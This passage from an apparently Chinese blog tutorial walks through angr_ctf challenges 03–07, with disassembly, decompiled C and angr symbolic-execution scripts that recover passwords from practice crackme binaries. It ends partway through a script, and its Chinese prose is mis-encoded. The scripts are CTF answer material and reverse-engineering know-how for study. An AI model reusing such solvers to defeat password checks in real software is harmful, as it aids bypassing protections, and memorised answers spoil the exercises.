<p>æœ€åçš„ç»“æœç­‰æ•ˆäº<code>scanf(&quot;%x %x %x&quot;, eax, ebx, edx)</code> æ—©æœŸçš„angræ— æ³•ä¸€æ¬¡è¾“å…¥å¤šä¸ªæ•°æ®(ç°åœ¨æµ‹è¯•æ˜¯å¯ä»¥ç›´æ¥æŒ‰ç…§å‰ä¸¤é¢˜çš„åšæ³•å‡ºç»“æœçš„) é‚£å°±éœ€è¦æˆ‘ä»¬ç›´æ¥è·³è¿‡è¯»å…¥æ•°æ®çš„è¿‡ç¨‹å¯¹eax, ebx, edxèµ‹å€¼ é‚£ä¹ˆè¿™æ¬¡çš„simstateå°±ä¸èƒ½è®¾ç½®ä¸º<code>entry_state()</code>äº† è€Œåº”è¯¥å°†å…¥å£è®¾ç½®ä¸ºè¯»å…¥æ•°æ®åä¸€è¡Œä»£ç :</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/23/20240723-101432.png" alt="image-20240723101425292"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">start_addr = <span class="number">0x804897B</span></span><br><span class="line">simstate = proj.factory.blank_state(addr=start_addr)</span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆå§‹åŒ–simstate å°†eax, ebx, edxè®¾å®šä¸ºå¾…å®šå€¼:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">simstate.regs.eax = claripy.BVS(<span class="string">&#x27;eax&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">simstate.regs.ebx = claripy.BVS(<span class="string">&#x27;ebx&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">simstate.regs.edx = claripy.BVS(<span class="string">&#x27;edx&#x27;</span>, <span class="number">32</span>)</span><br><span class="line"><span class="comment"># å¦‚æœä¸æƒ³å†å¯¼å…¥claripyæ¨¡å—å¯ä»¥å†™æˆä¸‹é¢çš„ç­‰æ•ˆå†™æ³•:</span></span><br><span class="line"><span class="comment"># simstate.regs.eax = simstate.solver.BVS(&#x27;eax&#x27;, 32)</span></span><br></pre></td></tr></table></figure>

<p>å®Œæ•´è„šæœ¬:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line">eip_record = []</span><br><span class="line">branch_record = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;eax: <span class="subst">&#123;<span class="built_in">hex</span>(state.solver.<span class="built_in">eval</span>(state.regs.eax))[<span class="number">2</span>:]&#125;</span> ebx: <span class="subst">&#123;<span class="built_in">hex</span>(state.solver.<span class="built_in">eval</span>(state.regs.ebx))[<span class="number">2</span>:]&#125;</span> edx: <span class="subst">&#123;<span class="built_in">hex</span>(state.solver.<span class="built_in">eval</span>(state.regs.edx))[<span class="number">2</span>:]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;03_angr_symbolic_registers&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>:<span class="literal">False</span>&#125;)</span><br><span class="line">    start_addr = <span class="number">0x804897B</span></span><br><span class="line">    simstate = proj.factory.blank_state(addr=start_addr)</span><br><span class="line">    simstate.regs.eax = claripy.BVS(<span class="string">&#x27;eax&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">    simstate.regs.ebx = claripy.BVS(<span class="string">&#x27;ebx&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">    simstate.regs.edx = claripy.BVS(<span class="string">&#x27;edx&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">    simmgr = proj.factory.simgr(simstate)</span><br><span class="line">    simmgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simmgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simmgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-symbolic-stack-æ ˆçš„åˆå§‹åŒ–"><a href="#angr-symbolic-stack-æ ˆçš„åˆå§‹åŒ–" class="headerlink" title="angr_symbolic_stack | æ ˆçš„åˆå§‹åŒ–"></a>angr_symbolic_stack | æ ˆçš„åˆå§‹åŒ–</h3><p>å’Œä¸Šä¸€é¢˜ä¸€æ · è¿™æ¬¡çš„ç¨‹åºè¦æ±‚ä¸€æ¬¡è¾“å…¥ä¸¤ä¸ªå€¼ ä¸åŒçš„æ˜¯è¿™æ¬¡ç›´æ¥å­˜æ”¾åˆ°æ ˆä¸Š ä¸ç”¨å¯„å­˜å™¨åšåª’ä»‹:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048679                               ; int handle_user()</span><br><span class="line">.text:08048679                               public handle_user</span><br><span class="line">.text:08048679                               handle_user proc near                   ; CODE XREF: main+21â†“p</span><br><span class="line">.text:08048679</span><br><span class="line">.text:08048679                               var_10= dword ptr -10h</span><br><span class="line">.text:08048679                               var_C= dword ptr -0Ch</span><br><span class="line">.text:08048679</span><br><span class="line">.text:08048679                               ; __unwind &#123;</span><br><span class="line">.text:08048679 55                            push    ebp</span><br><span class="line">.text:0804867A 89 E5                         mov     ebp, esp</span><br><span class="line">.text:0804867C 83 EC 18                      sub     esp, 18h</span><br><span class="line">.text:0804867F 83 EC 04                      sub     esp, 4</span><br><span class="line">.text:08048682 8D 45 F0                      lea     eax, [ebp+var_10]</span><br><span class="line">.text:08048685 50                            push    eax</span><br><span class="line">.text:08048686 8D 45 F4                      lea     eax, [ebp+var_C]</span><br><span class="line">.text:08048689 50                            push    eax</span><br><span class="line">.text:0804868A 68 B3 87 04 08                push    offset aUU                      ; &quot;%u %u&quot;</span><br><span class="line">.text:0804868F E8 DC FC FF FF                call    ___isoc99_scanf</span><br><span class="line">.text:0804868F</span><br><span class="line">.text:08048694 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:08048697 8B 45 F4                      mov     eax, [ebp+var_C]</span><br><span class="line">.text:0804869A 83 EC 0C                      sub     esp, 0Ch</span><br><span class="line">.text:0804869D 50                            push    eax</span><br><span class="line">.text:0804869E E8 06 FE FF FF                call    complex_function0</span><br><span class="line">.text:0804869E</span><br><span class="line">.text:080486A3 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:080486A6 89 45 F4                      mov     [ebp+var_C], eax</span><br><span class="line">.text:080486A9 8B 45 F0                      mov     eax, [ebp+var_10]</span><br><span class="line">.text:080486AC 83 EC 0C                      sub     esp, 0Ch</span><br><span class="line">.text:080486AF 50                            push    eax</span><br><span class="line">.text:080486B0 E8 DC FE FF FF                call    complex_function1</span><br><span class="line">.text:080486B0</span><br><span class="line">.text:080486B5 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:080486B8 89 45 F0                      mov     [ebp+var_10], eax</span><br><span class="line">.text:080486BB 8B 45 F4                      mov     eax, [ebp+var_C]</span><br><span class="line">.text:080486BE 3D D1 24 30 77                cmp     eax, 773024D1h</span><br><span class="line">.text:080486C3 75 0A                         jnz     short loc_80486CF</span><br><span class="line">.text:080486C3</span><br><span class="line">.text:080486C5 8B 45 F0                      mov     eax, [ebp+var_10]</span><br><span class="line">.text:080486C8 3D CF 11 43 BC                cmp     eax, 0BC4311CFh</span><br><span class="line">.text:080486CD 74 12                         jz      short loc_80486E1</span><br><span class="line">.text:080486CD</span><br><span class="line">.text:080486CF</span><br><span class="line">.text:080486CF                               loc_80486CF:                            ; CODE XREF: handle_user+4Aâ†‘j</span><br><span class="line">.text:080486CF 83 EC 0C                      sub     esp, 0Ch</span><br><span class="line">.text:080486D2 68 B9 87 04 08                push    offset s                        ; &quot;Try again.&quot;</span><br><span class="line">.text:080486D7 E8 74 FC FF FF                call    _puts</span><br><span class="line">.text:080486D7</span><br><span class="line">.text:080486DC 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:080486DF EB 10                         jmp     short loc_80486F1</span><br><span class="line">.text:080486DF</span><br><span class="line">.text:080486E1                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:080486E1</span><br><span class="line">.text:080486E1                               loc_80486E1:                            ; CODE XREF: handle_user+54â†‘j</span><br><span class="line">.text:080486E1 83 EC 0C                      sub     esp, 0Ch</span><br><span class="line">.text:080486E4 68 C4 87 04 08                push    offset aGoodJob                 ; &quot;Good Job.&quot;</span><br><span class="line">.text:080486E9 E8 62 FC FF FF                call    _puts</span><br><span class="line">.text:080486E9</span><br><span class="line">.text:080486EE 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:080486EE</span><br><span class="line">.text:080486F1</span><br><span class="line">.text:080486F1                               loc_80486F1:                            ; CODE XREF: handle_user+66â†‘j</span><br><span class="line">.text:080486F1 90                            nop</span><br><span class="line">.text:080486F2 C9                            leave</span><br><span class="line">.text:080486F3 C3                            retn</span><br></pre></td></tr></table></figure>

<p>è¾“å…¥å‡½æ•°ç­‰æ•ˆäº<code>scanf(&quot;%u %u&quot;, [val0](ebp - 0xC), [val1](ebp - 0x10))</code> ä¸ºäº†åœ¨æ ˆä¸Šæ­£ç¡®çš„ä½ç½®è¿›è¡Œå€¼çš„ç¬¦å·åŒ– ç®€å•çœ‹ä¸€ä¸‹æ ˆè¾“å…¥å®Œåæ ˆçš„ç»“æ„:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">       ebp - 4          ebp - 10h</span><br><span class="line">...|  ebx  |  ...  |  val0  |  val1  | ...</span><br><span class="line">ebp - 0         ebp - 8h         ebp - Ch</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ç¬¬ä¸€ä¸ªå€¼åœ¨ebp-8åˆ°ebp-10hä¹‹é—´ ç¬¬äºŒä¸ªåœ¨ebp-10håˆ°ebp-Cä¹‹é—´ ä¸ºäº†æ¨¡æ‹Ÿè¿›å…¥å‡½æ•°çš„è¿‡ç¨‹ åˆå§‹çŠ¶æ€ä¸­å°†espèµ‹ç»™ebp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">state = proj.factory.blank_state(addr = <span class="number">0x8048697</span>)</span><br><span class="line">state.regs.ebp = state.regs.esp</span><br></pre></td></tr></table></figure>

<p>å†å¯¹ebp-8å¤„çš„æ ˆç©ºé—´è¿›è¡Œç¬¦å·åŒ–:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p1 = claripy.BVS(<span class="string">&#x27;p1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">p2 = claripy.BVS(<span class="string">&#x27;p2&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">state.stack_push(p1)</span><br><span class="line">state.stack_push(p2)</span><br></pre></td></tr></table></figure>

<p>å®Œæ•´è„šæœ¬:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;04_angr_symbolic_stack&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    state = proj.factory.blank_state(addr = <span class="number">0x8048697</span>)</span><br><span class="line">    state.regs.ebp = state.regs.esp</span><br><span class="line">    state.regs.esp -= <span class="number">8</span></span><br><span class="line">    p1 = claripy.BVS(<span class="string">&#x27;p1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">    p2 = claripy.BVS(<span class="string">&#x27;p2&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">    state.stack_push(p1)</span><br><span class="line">    state.stack_push(p2)</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;p1: <span class="subst">&#123;<span class="built_in">hex</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(p1))&#125;</span>\np2: <span class="subst">&#123;<span class="built_in">hex</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(p2))&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-symbolic-memory-å†…å­˜ç©ºé—´åˆå§‹åŒ–1"><a href="#angr-symbolic-memory-å†…å­˜ç©ºé—´åˆå§‹åŒ–1" class="headerlink" title="angr_symbolic_memory | å†…å­˜ç©ºé—´åˆå§‹åŒ–1"></a>angr_symbolic_memory | å†…å­˜ç©ºé—´åˆå§‹åŒ–1</h3><p>å¦‚æœç¨‹åºè¦ç”¨åˆ°çš„å€¼ä¸æ˜¯æœ¬åœ°å˜é‡è€Œæ˜¯å…¨å±€å˜é‡ é‚£å°±éœ€è¦å¯¹å¯¹åº”çš„å†…å­˜åŒºåŸŸè¿›è¡Œç¬¦å·åŒ–å†æ±‚è§£ è¿™é¢˜æ ¡éªŒçš„å€¼æ”¾åœ¨<code>.bss</code>æ®µä¸Š:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/24/20240724-112406.png" alt="image-20240724112359400"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/24/20240724-112412.png" alt="image-20240724112412817"></p>
<p>å’Œä¹‹å‰ä¸€æ ·è·³è¿‡è¾“å…¥éƒ¨åˆ†(ç°ç‰ˆæœ¬angrå·²ç»æ”¯æŒç›´æ¥è¾“å…¥ å¯ä»¥æŒ‰ç…§ç¬¬1, 2é¢˜çš„æ–¹æ³•åš ä¸‹é¢ä¸€é¢˜ä¹Ÿæ˜¯) å¹¶å¯¹ç›®æ ‡åŒºåŸŸè¿›è¡Œç¬¦å·åŒ–(å…¶å®æ ˆçš„åˆå§‹åŒ–æœ¬è´¨ä¸Šä¹Ÿæ˜¯å†…å­˜åŒºåŸŸåˆå§‹åŒ– å¯ä»¥ç”¨ä¸€æ ·çš„æ–¹æ³•è¿›è¡Œå€¼çš„ç¬¦å·åŒ–) å®Œæ•´è„šæœ¬:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;05_angr_symbolic_memory&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    <span class="comment"># state = proj.factory.entry_state()</span></span><br><span class="line">    state = proj.factory.blank_state(addr = <span class="number">0x80485FE</span>)</span><br><span class="line">    bss = <span class="number">0xA1BA1C0</span></span><br><span class="line">    pws = [claripy.BVS(<span class="string">&#x27;pw%d&#x27;</span> % i, <span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="comment"># å¯¹.bssæ®µä¸Šçš„å€¼è¿›è¡Œåˆå§‹åŒ– memory.store()é»˜è®¤ä½¿ç”¨å¤§ç«¯åºè¿›è¡Œå¡«å…… æ·»åŠ å‚æ•°endness = proj.arch.memory_endnesså¯ä»¥å¼ºåˆ¶ä»¥ç¨‹åºçš„ç«¯åºè¿›è¡Œå¡«å……</span></span><br><span class="line">        state.memory.store(bss + i * <span class="number">8</span>, pws[i])</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="comment"># print(simgr.found[0].posix.dumps(0))</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(pws[i], cast_to=<span class="built_in">bytes</span>), end = <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-symbolic-dynamic-memory-å†…å­˜ç©ºé—´åˆå§‹åŒ–2"><a href="#angr-symbolic-dynamic-memory-å†…å­˜ç©ºé—´åˆå§‹åŒ–2" class="headerlink" title="angr_symbolic_dynamic_memory | å†…å­˜ç©ºé—´åˆå§‹åŒ–2"></a>angr_symbolic_dynamic_memory | å†…å­˜ç©ºé—´åˆå§‹åŒ–2</h3><p>å¦‚æœè¦ç¬¦å·åŒ–çš„å†…å­˜åŒºåŸŸä¸€å¼€å§‹æ˜¯ä¸ç¡®å®šçš„ å¯ä»¥é€€è€Œæ±‚å…¶æ¬¡ä¸å¯¹åŸæœ¬è¦æ ¡éªŒçš„åŒºåŸŸè¿›è¡Œç¬¦å·åŒ– è€Œæ˜¯æ›´æ”¹è¦æ ¡éªŒçš„åŒºåŸŸå°†å…¶å›ºå®šä¸‹æ¥ è¿™é¢˜ç”¨<code>malloc()</code>è¿›è¡Œå†…å­˜åˆ†é…:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-10h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  buffer0 = <span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  buffer1 = <span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer0, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer1, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s %8s&quot;</span>, buffer0, buffer1, v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = &amp;buffer0[i];</span><br><span class="line">    *v3 = complex_function(buffer0[i], i);</span><br><span class="line">    v4 = &amp;buffer1[i];</span><br><span class="line">    *v4 = complex_function(buffer1[i], i + <span class="number">32</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buffer0, <span class="string">&quot;UODXLZBI&quot;</span>, <span class="number">8u</span>) &amp;&amp; !<span class="built_in">strncmp</span>(buffer1, <span class="string">&quot;UAORRAYF&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(buffer0);</span><br><span class="line">  <span class="built_in">free</span>(buffer1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/24/20240724-113755.png" alt="image-20240724113755497"></p>
<p>mallocåˆ†é…çš„å†…å­˜åœ¨<code>.heap</code>å †ç©ºé—´ä¸Š å’Œæœ¬åœ°å˜é‡ä¸€æ ·ä¸€å¼€å§‹æ˜¯ä¸ç¡®å®šå…¶åœ°å€çš„ é‚£å°±ç›´æ¥æ”¹å˜<code>buffer0[1]</code>å­˜æ”¾çš„å†…å­˜åœ°å€:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;06_angr_symbolic_dynamic_memory&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    start = <span class="number">0x08048696</span></span><br><span class="line">    state = proj.factory.blank_state(addr = start)</span><br><span class="line">    p1 = <span class="number">0xABCC8A4</span></span><br><span class="line">    p2 = <span class="number">0xABCC8AC</span></span><br><span class="line">    bss1 = <span class="number">0xABCC890</span></span><br><span class="line">    bss2 = <span class="number">0xABCC880</span></span><br><span class="line">    <span class="comment"># æŠŠåŸæœ¬å­˜æ”¾æ ¡éªŒå€¼çš„å †åœ°å€æ”¹æˆå›ºå®šçš„.bssæ®µä¸Šçš„ç©ºé—²ç©ºé—´çš„åœ°å€</span></span><br><span class="line">    state.memory.store(p1, bss1, endness=proj.arch.memory_endness)</span><br><span class="line">    state.memory.store(p2, bss2, endness=proj.arch.memory_endness)</span><br><span class="line">    pws = [state.solver.BVS(<span class="string">&#x27;p1&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>), state.solver.BVS(<span class="string">&#x27;p2&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>)]</span><br><span class="line">    state.memory.store(bss1, pws[<span class="number">0</span>])</span><br><span class="line">    state.memory.store(bss2, pws[<span class="number">1</span>])</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(pws[<span class="number">0</span>], cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">        <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(pws[<span class="number">1</span>], cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-symbolic-file-æ–‡ä»¶å†…å®¹åˆå§‹åŒ–"><a href="#angr-symbolic-file-æ–‡ä»¶å†…å®¹åˆå§‹åŒ–" class="headerlink" title="angr_symbolic_file | æ–‡ä»¶å†…å®¹åˆå§‹åŒ–"></a>angr_symbolic_file | æ–‡ä»¶å†…å®¹åˆå§‹åŒ–</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%64s&quot;</span>, buffer);</span><br><span class="line">  ignore_me(buffer, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  fp = fopen(<span class="string">&quot;OJKSQYDP.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  fread(buffer, <span class="number">1u</span>, <span class="number">0x40</span>u, fp);</span><br><span class="line">  fclose(fp);</span><br><span class="line">  unlink(<span class="string">&quot;OJKSQYDP.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">0x804A0A0</span>) = complex_function(*(<span class="type">char</span> *)(i + <span class="number">0x804A0A0</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buffer, <span class="string">&quot;AQWLCTXB&quot;</span>, <span class="number">9u</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ignore_me()</code>çš„ä½œç”¨å°±æ˜¯å°†è¾“å…¥çš„å†…å®¹æ”¾è¿›æ–‡ä»¶é‡Œä¿å­˜ä»¥é˜²ä¸‹é¢è¯»ä¸åˆ°æ–‡ä»¶ è¿™é¢˜å¯ä»¥åœ¨è¯»å–æ–‡ä»¶å†…å®¹åå¼€å§‹å¯¹<code>buffer</code>åˆå§‹åŒ–(æµ‹è¯•åå‘ç°ç”šè‡³å¯ä»¥ä»å¤´å¼€å§‹æ‰§è¡Œ angrä¹Ÿèƒ½æ±‚è§£å‡ºç­”æ¡ˆ) è¿™é‡Œä»è¯»å–æ–‡ä»¶å¼€å§‹å­¦ä¹ ä¸€ä¸‹æ–‡ä»¶å†…å®¹çš„ç¬¦å·åŒ–:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;07_angr_symbolic_file&#x27;</span>, load_options=&#123;<span 